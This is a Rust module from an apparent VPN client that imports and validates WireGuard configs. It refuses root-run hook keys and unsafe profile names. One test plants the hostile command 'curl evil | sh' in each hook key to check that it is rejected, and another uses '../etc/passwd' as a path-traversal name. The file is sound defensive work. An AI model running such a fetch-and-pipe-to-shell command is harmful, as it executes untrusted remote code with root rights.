//! Direct profiles: connecting with a WireGuard config the user already has.
//!
//! The managed flow — sign in, register the device, get a session from the
//! control plane — is what a deployment runs. But a team with a WireGuard
//! server and a `.conf` per person should be able to open the app and connect
//! today, and add sign-in when the control plane is in front of that server.
//! This is that path: import the file once, then Connect and Disconnect bring
//! it up and down exactly as the managed flow does, through the same
//! privileged `wg-quick` invocation.
//!
//! The file is validated on import rather than handed to `wg-quick` as-is,
//! because `wg-quick` runs as root. `PreUp`, `PostUp`, `PreDown` and
//! `PostDown` are shell commands, and a config someone was sent by email would
//! otherwise run whatever it liked with the administrator rights the user
//! granted to "connect to the VPN". They are refused, and so is any key
//! `wg-quick` would not recognise, so a typo fails here with a line number
//! rather than later inside an authorization dialog.

use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use base64::Engine;
use serde::{Deserialize, Serialize};

use crate::state::{write_private_file, AgentState};
use crate::tunnel::{self, Escalation, TunnelState};

/// What the UI and `wsl status` show about an imported profile. The private
/// key stays in the file; it is never copied into agent state.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DirectProfile {
    pub name: String,
    pub endpoint: String,
    pub address: Vec<String>,
    pub dns: Vec<String>,
    pub allowed_ips: Vec<String>,
    /// This device's public key, derived from the private key in the file.
    #[serde(default)]
    pub public_key: Option<String>,
    #[serde(default)]
    pub mtu: Option<String>,
    #[serde(default)]
    pub listen_port: Option<String>,
    #[serde(default)]
    pub peers: Vec<PeerSummary>,
}

/// One `[Peer]`, for display.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PeerSummary {
    pub public_key: String,
    pub endpoint: Option<String>,
    pub allowed_ips: Vec<String>,
    pub persistent_keepalive: Option<String>,
}

const INTERFACE_KEYS: &[&str] = &[
    "privatekey",
    "address",
    "dns",
    "mtu",
    "listenport",
    "table",
    "fwmark",
    "saveconfig",
];
const PEER_KEYS: &[&str] = &[
    "publickey",
    "presharedkey",
    "allowedips",
    "endpoint",
    "persistentkeepalive",
];
const HOOK_KEYS: &[&str] = &["preup", "postup", "predown", "postdown"];

#[derive(PartialEq)]
enum Section {
    None,
    Interface,
    Peer,
}

fn split_list(value: &str) -> Vec<String> {
    value
        .split(',')
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .collect()
}

fn is_key(value: &str) -> bool {
    base64::engine::general_purpose::STANDARD
        .decode(value.trim())
        .map(|bytes| bytes.len() == 32)
        .unwrap_or(false)
}

/// The config as wg-quick should read it.
///
/// WireGuard for Windows and Notepad save UTF-8 with a byte order mark, which
/// wg-quick takes as part of `[Interface]` and then ignores every key under
/// it. Configs that went through Windows also arrive with CRLF line endings.
/// Neither is a reason to refuse a file the official apps accept, so both are
/// removed here, before validation and before the file is stored.
pub fn normalise(text: &str) -> String {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let mut out: String = text.lines().map(|l| format!("{l}\n")).collect();
    if out.is_empty() {
        out.push('\n');
    }
    out
}

/// Check a wg-quick config and say what it connects to.
pub fn validate(text: &str, name: &str) -> Result<DirectProfile> {
    let text = &normalise(text);
    let mut section = Section::None;
    let mut interfaces = 0;
    let mut peers = 0;
    let mut private_key = false;
    let mut profile = DirectProfile {
        name: name.to_string(),
        endpoint: String::new(),
        address: Vec::new(),
        dns: Vec::new(),
        allowed_ips: Vec::new(),
        public_key: None,
        mtu: None,
        listen_port: None,
        peers: Vec::new(),
    };
    let mut peer_has_key = true;
    let mut peer_has_allowed = true;

    let close_peer = |has_key: bool, has_allowed: bool, line: usize| -> Result<()> {
        if !has_key {
            bail!("the [Peer] ending before line {line} has no PublicKey");
        }
        if !has_allowed {
            bail!("the [Peer] ending before line {line} has no AllowedIPs");
        }
        Ok(())
    };

    for (index, raw) in text.lines().enumerate() {
        let line_no = index + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            if section == Section::Peer {
                close_peer(peer_has_key, peer_has_allowed, line_no)?;
            }
            section = match line.to_ascii_lowercase().as_str() {
                "[interface]" => {
                    interfaces += 1;
                    Section::Interface
                }
                "[peer]" => {
                    peers += 1;
                    profile.peers.push(PeerSummary {
                        public_key: String::new(),
                        endpoint: None,
                        allowed_ips: Vec::new(),
                        persistent_keepalive: None,
                    });
                    peer_has_key = false;
                    peer_has_allowed = false;
                    Section::Peer
                }
                other => bail!("line {line_no}: unknown section {other}"),
            };
            continue;
        }
        let (key, value) = line
            .split_once('=')
            .with_context(|| format!("line {line_no}: expected `Key = value`"))?;
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();

        if HOOK_KEYS.contains(&key.as_str()) {
            bail!(
                "line {line_no}: {} runs a shell command as root when the tunnel \
                 changes state, so imported configs may not contain it. Remove the \
                 line and import again.",
                raw.split('=').next().unwrap_or("").trim()
            );
        }
        match section {
            Section::None => bail!("line {line_no}: `{key}` is outside any section"),
            Section::Interface => {
                if !INTERFACE_KEYS.contains(&key.as_str()) {
                    bail!("line {line_no}: `{key}` is not a WireGuard [Interface] setting");
                }
                match key.as_str() {
                    "privatekey" => {
                        if !is_key(value) {
                            bail!("line {line_no}: PrivateKey is not a WireGuard key");
                        }
                        private_key = true;
                        profile.public_key = wsl_crypto::public_key_from_private(value);
                    }
                    "address" => profile.address.extend(split_list(value)),
                    "dns" => profile.dns.extend(split_list(value)),
                    "mtu" => profile.mtu = Some(value.to_string()),
                    "listenport" => profile.listen_port = Some(value.to_string()),
                    _ => {}
                }
            }
            Section::Peer => {
                if !PEER_KEYS.contains(&key.as_str()) {
                    bail!("line {line_no}: `{key}` is not a WireGuard [Peer] setting");
                }
                let peer = profile.peers.last_mut().expect("a [Peer] was opened");
                match key.as_str() {
                    "publickey" => {
                        if !is_key(value) {
                            bail!("line {line_no}: PublicKey is not a WireGuard key");
                        }
                        peer_has_key = true;
                        peer.public_key = value.to_string();
                    }
                    "presharedkey" if !is_key(value) => {
                        bail!("line {line_no}: PresharedKey is not a WireGuard key")
                    }
                    "allowedips" => {
                        peer_has_allowed = true;
                        peer.allowed_ips.extend(split_list(value));
                        profile.allowed_ips.extend(split_list(value));
                    }
                    "endpoint" => {
                        peer.endpoint = Some(value.to_string());
                        if profile.endpoint.is_empty() {
                            profile.endpoint = value.to_string();
                        }
                    }
                    "persistentkeepalive" => peer.persistent_keepalive = Some(value.to_string()),
                    _ => {}
                }
            }
        }
    }
    if section == Section::Peer {
        close_peer(peer_has_key, peer_has_allowed, text.lines().count() + 1)?;
    }
    if interfaces != 1 {
        bail!("a config needs exactly one [Interface] section, found {interfaces}");
    }
    if peers == 0 {
        bail!("the config has no [Peer]: there is no server to connect to");
    }
    if !private_key {
        bail!("[Interface] has no PrivateKey");
    }
    if profile.address.is_empty() {
        bail!("[Interface] has no Address");
    }
    if profile.endpoint.is_empty() {
        bail!("no [Peer] has an Endpoint, so there is nothing to connect to");
    }
    Ok(profile)
}

/// Where a single imported profile lived before there was a list of them.
/// Read once, by [`ensure_library_in`], to carry it over.
pub fn profile_conf_path() -> Result<PathBuf> {
    Ok(AgentState::data_dir()?.join("profile.conf"))
}

/// A profile's file name: its name, with spaces as underscores.
///
/// The name becomes a path under the data directory, so it is checked
/// first: letters, digits, space, `.`, `_` and `-`, up to 64, not starting
/// with a dot. Nothing that could leave the directory gets through.
fn file_stem(name: &str) -> Result<String> {
    let name = name.trim();
    let ok = !name.is_empty()
        && name.chars().count() <= 64
        && !name.starts_with('.')
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, ' ' | '.' | '_' | '-'));
    if !ok {
        bail!(
            "`{name}` cannot be a profile name: use letters, digits, spaces, `.`, `_` \
             or `-`, up to 64 characters"
        );
    }
    Ok(name.replace(' ', "_"))
}

pub fn conf_path_in(data: &Path, name: &str) -> PathBuf {
    let stem = file_stem(name).unwrap_or_else(|_| "invalid".into());
    data.join("profiles").join(format!("{stem}.conf"))
}

fn same(a: &str, b: &str) -> bool {
    match (file_stem(a), file_stem(b)) {
        (Ok(a), Ok(b)) => a.eq_ignore_ascii_case(&b),
        _ => false,
    }
}

/// Carry a profile imported before profiles were a list into the list.
pub fn ensure_library_in(data: &Path, state: &mut AgentState) -> Result<()> {
    let Some(active) = state.profile.clone() else {
        return Ok(());
    };
    let path = conf_path_in(data, &active.name);
    if !path.exists() {
        let legacy = data.join("profile.conf");
        if let Ok(text) = std::fs::read_to_string(&legacy) {
            std::fs::create_dir_all(data.join("profiles"))?;
            write_private_file(&path, &text)?;
        }
    }
    if !state.profiles.iter().any(|p| same(&p.name, &active.name)) {
        state.profiles.insert(0, active);
    }
    Ok(())
}

/// Add a profile, or replace the one with the same name (which is how an
/// edit is saved). The first profile becomes the active one; importing more
/// does not switch away from it.
pub fn import_in(
    data: &Path,
    state: &mut AgentState,
    text: &str,
    name: &str,
) -> Result<DirectProfile> {
    ensure_library_in(data, state)?;
    let name = name.trim();
    file_stem(name)?;
    let text = normalise(text);
    let profile = validate(&text, name)?;
    std::fs::create_dir_all(data.join("profiles"))?;
    write_private_file(&conf_path_in(data, name), &text)?;
    match state.profiles.iter_mut().find(|p| same(&p.name, name)) {
        Some(existing) => *existing = profile.clone(),
        None => state.profiles.push(profile.clone()),
    }
    let replaces_active = state.profile.as_ref().is_some_and(|p| same(&p.name, name));
    if state.profile.is_none() || replaces_active {
        state.profile = Some(profile.clone());
    }
    Ok(profile)
}

/// Make `name` the profile Connect uses.
pub fn select_in(state: &mut AgentState, name: &str) -> Result<DirectProfile> {
    let found = state
        .profiles
        .iter()
        .find(|p| same(&p.name, name))
        .cloned()
        .with_context(|| format!("no profile named `{name}`; see `wsl profile list`"))?;
    state.profile = Some(found.clone());
    Ok(found)
}

/// Delete a profile (the active one when `name` is `None`). `tunnel_up` says
/// whether the active profile's tunnel is up: removing the file an interface
/// was brought up from leaves nothing to bring it down with.
pub fn remove_in(
    data: &Path,
    state: &mut AgentState,
    name: Option<&str>,
    tunnel_up: bool,
) -> Result<()> {
    ensure_library_in(data, state)?;
    let target = match name {
        Some(n) => n.to_string(),
        None => state
            .profile
            .as_ref()
            .map(|p| p.name.clone())
            .context("no profile to remove")?,
    };
    let is_active = state
        .profile
        .as_ref()
        .is_some_and(|p| same(&p.name, &target));
    if is_active && tunnel_up && state.session.is_none() {
        bail!("disconnect first; the tunnel is up from `{target}`");
    }
    let before = state.profiles.len();
    state.profiles.retain(|p| !same(&p.name, &target));
    if state.profiles.len() == before && !is_active {
        bail!("no profile named `{target}`");
    }
    let path = conf_path_in(data, &target);
    if path.exists() {
        std::fs::remove_file(&path).with_context(|| format!("removing {}", path.display()))?;
    }
    if is_active {
        let legacy = data.join("profile.conf");
        if legacy.exists() {
            let _ = std::fs::remove_file(legacy);
        }
        state.profile = state.profiles.first().cloned();
    }
    Ok(())
}

/// The stored config of `name`, as wg-quick will read it. For Edit.
pub fn config_text_in(data: &Path, state: &AgentState, name: &str) -> Result<String> {
    let profile = state
        .profiles
        .iter()
        .chain(state.profile.iter())
        .find(|p| same(&p.name, name))
        .with_context(|| format!("no profile named `{name}`"))?;
    std::fs::read_to_string(conf_path_in(data, &profile.name))
        .or_else(|_| std::fs::read_to_string(data.join("profile.conf")))
        .with_context(|| format!("the config for `{name}` is missing; import it again"))
}

/// A display name from a file name: `office.conf` becomes `office`.
pub fn name_from_path(path: &Path) -> String {
    path.file_stem()
        .map(|s| s.to_string_lossy().into_owned())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "WireGuard".into())
}

/// Validate, store privately, and record the profile in agent state.
pub fn import(state: &mut AgentState, text: &str, name: &str) -> Result<DirectProfile> {
    let profile = import_in(&AgentState::data_dir()?, state, text, name)?;
    state.save()?;
    Ok(profile)
}

pub fn select(state: &mut AgentState, name: &str) -> Result<DirectProfile> {
    ensure_library_in(&AgentState::data_dir()?, state)?;
    let profile = select_in(state, name)?;
    state.save()?;
    Ok(profile)
}

/// Forget a profile — the active one when `name` is `None`.
pub fn remove(state: &mut AgentState, name: Option<&str>) -> Result<()> {
    let up = tunnel::state().is_up();
    remove_in(&AgentState::data_dir()?, state, name, up)?;
    state.save()
}

pub fn config_text(state: &AgentState, name: &str) -> Result<String> {
    config_text_in(&AgentState::data_dir()?, state, name)
}

/// All profiles, the legacy single one included.
pub fn list(state: &mut AgentState) -> Result<Vec<DirectProfile>> {
    ensure_library_in(&AgentState::data_dir()?, state)?;
    Ok(state.profiles.clone())
}

/// Bring the tunnel up from the active profile.
///
/// The profile is copied to the interface's config path, not used in place:
/// `wg-quick` names the interface after the file, and the rest of the agent
/// looks for it under that one name. A tunnel already up from another
/// profile is taken down first, in the same privileged run.
pub async fn connect(state: &AgentState, escalation: Escalation) -> Result<TunnelState> {
    let Some(active) = &state.profile else {
        bail!("no WireGuard profile imported; run `wsl profile import <file>`");
    };
    let text = config_text_in(&AgentState::data_dir()?, state, &active.name)?;
    let conf = AgentState::wg_conf_path()?;
    write_private_file(&conf, &text)?;
    // `--no-tunnel` means nothing without a session, so do not suggest it.
    tunnel::up_with_hint(&conf, escalation, "Re-run as `sudo wsl connect`.").await
}

pub async fn disconnect(escalation: Escalation) -> Result<()> {
    tunnel::down(&AgentState::wg_conf_path()?, escalation).await
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";
    /// `wg pubkey` of KEY.
    const DERIVED: &str = "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw=";

    fn good() -> String {
        format!(
            "[Interface]\nPrivateKey = {KEY}\nAddress = 10.8.0.2/32, fd00::2/128\nDNS = 10.8.0.1\n\n\
             [Peer]\nPublicKey = {PUB}\nEndpoint = vpn.example.com:51820\n\
             AllowedIPs = 10.8.0.0/24, 10.9.0.0/16\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn a_typical_client_config_is_accepted_and_summarised() {
        let p = validate(&good(), "office").unwrap();
        assert_eq!(p.name, "office");
        assert_eq!(p.endpoint, "vpn.example.com:51820");
        assert_eq!(p.address, vec!["10.8.0.2/32", "fd00::2/128"]);
        assert_eq!(p.dns, vec!["10.8.0.1"]);
        assert_eq!(p.allowed_ips, vec!["10.8.0.0/24", "10.9.0.0/16"]);
    }

    #[test]
    fn keys_and_sections_are_case_insensitive_like_wg_quick() {
        let text = good()
            .replace("[Interface]", "[interface]")
            .replace("PrivateKey", "privatekey");
        assert!(validate(&text, "x").is_ok());
    }

    /// wg-quick runs these as root. A config from an email must not.
    #[test]
    fn hook_commands_are_refused_with_the_reason() {
        for hook in ["PreUp", "PostUp", "PreDown", "PostDown"] {
            let text = good().replace(
                "DNS = 10.8.0.1",
                &format!("DNS = 10.8.0.1\n{hook} = curl evil | sh"),
            );
            let err = validate(&text, "x").unwrap_err().to_string();
            assert!(err.contains(hook), "{err}");
            assert!(err.contains("root"), "{err}");
            assert!(err.contains("line 5"), "{err}");
        }
    }

    #[test]
    fn an_unknown_key_is_named_with_its_line() {
        let text = good().replace("DNS = 10.8.0.1", "DNS = 10.8.0.1\nAdress = 10.0.0.1");
        let err = validate(&text, "x").unwrap_err().to_string();
        assert!(err.contains("line 5") && err.contains("adress"), "{err}");
    }

    #[test]
    fn a_config_with_no_peer_endpoint_has_nothing_to_connect_to() {
        let text = good().replace("Endpoint = vpn.example.com:51820\n", "");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("Endpoint"));
    }

    #[test]
    fn a_config_with_no_peer_is_refused() {
        let text = good();
        let text = &text[..text.find("[Peer]").unwrap()];
        assert!(validate(text, "x")
            .unwrap_err()
            .to_string()
            .contains("[Peer]"));
    }

    #[test]
    fn a_peer_without_allowed_ips_is_refused() {
        let text = good().replace("AllowedIPs = 10.8.0.0/24, 10.9.0.0/16\n", "");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("AllowedIPs"));
    }

    #[test]
    fn a_malformed_key_is_caught_here_not_in_wg_quick() {
        let text = good().replace(KEY, "not-a-key");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("PrivateKey"));
    }

    #[test]
    fn missing_address_or_private_key_is_refused() {
        let no_addr = good().replace("Address = 10.8.0.2/32, fd00::2/128\n", "");
        assert!(validate(&no_addr, "x")
            .unwrap_err()
            .to_string()
            .contains("Address"));
        let no_key = good().replace(&format!("PrivateKey = {KEY}\n"), "");
        assert!(validate(&no_key, "x")
            .unwrap_err()
            .to_string()
            .contains("PrivateKey"));
    }

    #[test]
    fn two_interfaces_are_refused() {
        let text = format!("{}\n[Interface]\nAddress = 10.0.0.1/32\n", good());
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("exactly one"));
    }

    #[test]
    fn comments_are_ignored_the_way_wg_quick_ignores_them() {
        let text = format!(
            "# exported from the server\n{}",
            good().replace("DNS = 10.8.0.1", "DNS = 10.8.0.1 # office")
        );
        assert_eq!(validate(&text, "x").unwrap().dns, vec!["10.8.0.1"]);
    }

    /// Windows' WireGuard app and Notepad save UTF-8 with a byte order mark.
    /// It is invisible in every editor and must not cost the first line.
    #[test]
    fn a_byte_order_mark_is_not_part_of_the_first_line() {
        let text = format!("\u{feff}{}", good().replace('\n', "\r\n"));
        let p = validate(&text, "office").unwrap();
        assert_eq!(p.endpoint, "vpn.example.com:51820");
        assert_eq!(p.dns, vec!["10.8.0.1"]);
    }

    /// What is stored is what wg-quick reads, so it is stored the way
    /// wg-quick reads best: no BOM, LF line endings, a final newline.
    #[test]
    fn the_stored_config_is_normalised_for_wg_quick() {
        let text = format!("\u{feff}{}", good().trim_end().replace('\n', "\r\n"));
        let stored = normalise(&text);
        assert!(stored.starts_with("[Interface]\n"), "{stored:?}");
        assert!(!stored.contains('\r'));
        assert!(stored.ends_with('\n'));
        assert_eq!(
            validate(&stored, "x").unwrap(),
            validate(&text, "x").unwrap()
        );
    }

    /// A config as the official WireGuard apps and common servers (wg-easy,
    /// PiVPN) export it: ListenPort, MTU, a preshared key, full-tunnel routes,
    /// a DNS search domain, and a second peer that is reached through the
    /// first and so has no endpoint of its own.
    #[test]
    fn a_config_exported_by_the_wireguard_app_is_accepted() {
        let text = format!(
            "[Interface]\nPrivateKey = {KEY}\nListenPort = 51820\nAddress = 10.8.0.2/24\n\
             DNS = 10.8.0.1, corp.example\nMTU = 1420\n\n\
             [Peer]\nPublicKey = {PUB}\nPresharedKey = {KEY}\nAllowedIPs = 0.0.0.0/0, ::/0\n\
             Endpoint = [2001:db8::1]:51820\nPersistentKeepalive = 0\n\n\
             [Peer]\nPublicKey = {KEY}\nAllowedIPs = 10.20.0.0/16\n"
        );
        let p = validate(&text, "home").unwrap();
        assert_eq!(p.endpoint, "[2001:db8::1]:51820");
        assert_eq!(p.dns, vec!["10.8.0.1", "corp.example"]);
        assert_eq!(p.allowed_ips, vec!["0.0.0.0/0", "::/0", "10.20.0.0/16"]);
    }

    /// What the detail pane shows, as the WireGuard app shows it.
    #[test]
    fn the_details_the_window_shows_are_read_from_the_config() {
        let text = format!(
            "[Interface]\nPrivateKey = {KEY}\nListenPort = 51820\nAddress = 10.8.0.18/32\nMTU = 1280\n\n\
             [Peer]\nPublicKey = {PUB}\nAllowedIPs = 10.8.0.0/24, 192.168.1.0/24\n\
             Endpoint = vpnhh.example.com:51820\nPersistentKeepalive = 25\n\n\
             [Peer]\nPublicKey = {DERIVED}\nAllowedIPs = 10.20.0.0/16\n"
        );
        let p = validate(&text, "Workstation VPN").unwrap();
        // Derived, as `wg pubkey` would; the private key itself is never copied.
        assert_eq!(p.public_key.as_deref(), Some(DERIVED));
        assert!(!serde_json::to_string(&p).unwrap().contains(KEY));
        assert_eq!(p.mtu.as_deref(), Some("1280"));
        assert_eq!(p.listen_port.as_deref(), Some("51820"));
        assert_eq!(p.peers.len(), 2);
        assert_eq!(p.peers[0].public_key, PUB);
        assert_eq!(
            p.peers[0].endpoint.as_deref(),
            Some("vpnhh.example.com:51820")
        );
        assert_eq!(
            p.peers[0].allowed_ips,
            vec!["10.8.0.0/24", "192.168.1.0/24"]
        );
        assert_eq!(p.peers[0].persistent_keepalive.as_deref(), Some("25"));
        assert_eq!(p.peers[1].endpoint, None);
    }

    fn library() -> (PathBuf, AgentState) {
        let dir = std::env::temp_dir().join(format!(
            "wsl-profiles-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        (dir, AgentState::default())
    }

    #[test]
    fn several_profiles_are_kept_and_the_first_becomes_active() {
        let (dir, mut state) = library();
        import_in(&dir, &mut state, &good(), "Office").unwrap();
        import_in(
            &dir,
            &mut state,
            &good().replace("vpn.example.com", "home.example.com"),
            "Home",
        )
        .unwrap();
        let names: Vec<_> = state.profiles.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, vec!["Office", "Home"]);
        assert_eq!(
            state.profile.as_ref().unwrap().name,
            "Office",
            "importing does not switch"
        );
        assert!(conf_path_in(&dir, "Home").is_file());

        select_in(&mut state, "Home").unwrap();
        assert_eq!(
            state.profile.as_ref().unwrap().endpoint,
            "home.example.com:51820"
        );
        assert!(config_text_in(&dir, &state, "Home")
            .unwrap()
            .contains("home.example.com"));
        assert!(select_in(&mut state, "Nowhere").is_err());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn importing_an_existing_name_replaces_it_which_is_how_edit_saves() {
        let (dir, mut state) = library();
        import_in(&dir, &mut state, &good(), "Office").unwrap();
        let edited = good().replace("DNS = 10.8.0.1", "DNS = 1.1.1.1");
        import_in(&dir, &mut state, &edited, "Office").unwrap();
        assert_eq!(state.profiles.len(), 1);
        assert_eq!(state.profile.as_ref().unwrap().dns, vec!["1.1.1.1"]);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn removing_the_active_profile_makes_the_next_one_active() {
        let (dir, mut state) = library();
        import_in(&dir, &mut state, &good(), "Office").unwrap();
        import_in(&dir, &mut state, &good(), "Home").unwrap();
        remove_in(&dir, &mut state, Some("Office"), false).unwrap();
        assert!(!conf_path_in(&dir, "Office").exists());
        assert_eq!(state.profile.as_ref().unwrap().name, "Home");
        remove_in(&dir, &mut state, None, false).unwrap();
        assert!(state.profile.is_none() && state.profiles.is_empty());
        // The live tunnel's profile cannot be deleted from under it.
        import_in(&dir, &mut state, &good(), "Office").unwrap();
        assert!(remove_in(&dir, &mut state, None, true)
            .unwrap_err()
            .to_string()
            .contains("disconnect"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn names_become_safe_file_names() {
        let (dir, mut state) = library();
        for bad in ["", "../etc/passwd", "a/b", ".hidden", &"x".repeat(65)] {
            assert!(
                import_in(&dir, &mut state, &good(), bad).is_err(),
                "{bad:?}"
            );
        }
        import_in(&dir, &mut state, &good(), "Workstation VPN").unwrap();
        assert!(dir.join("profiles").join("Workstation_VPN.conf").is_file());
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Someone who imported one profile before there was a list keeps it.
    #[test]
    fn a_single_profile_from_before_the_library_is_carried_over() {
        let (dir, mut state) = library();
        std::fs::write(dir.join("profile.conf"), good()).unwrap();
        state.profile = Some(validate(&good(), "myvpnwireguard").unwrap());
        ensure_library_in(&dir, &mut state).unwrap();
        assert_eq!(state.profiles.len(), 1);
        assert!(conf_path_in(&dir, "myvpnwireguard").is_file());
        assert!(config_text_in(&dir, &state, "myvpnwireguard")
            .unwrap()
            .contains("vpn.example.com"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn the_name_comes_from_the_file() {
        assert_eq!(name_from_path(Path::new("/tmp/office.conf")), "office");
        assert_eq!(name_from_path(Path::new("/")), "WireGuard");
    }
}
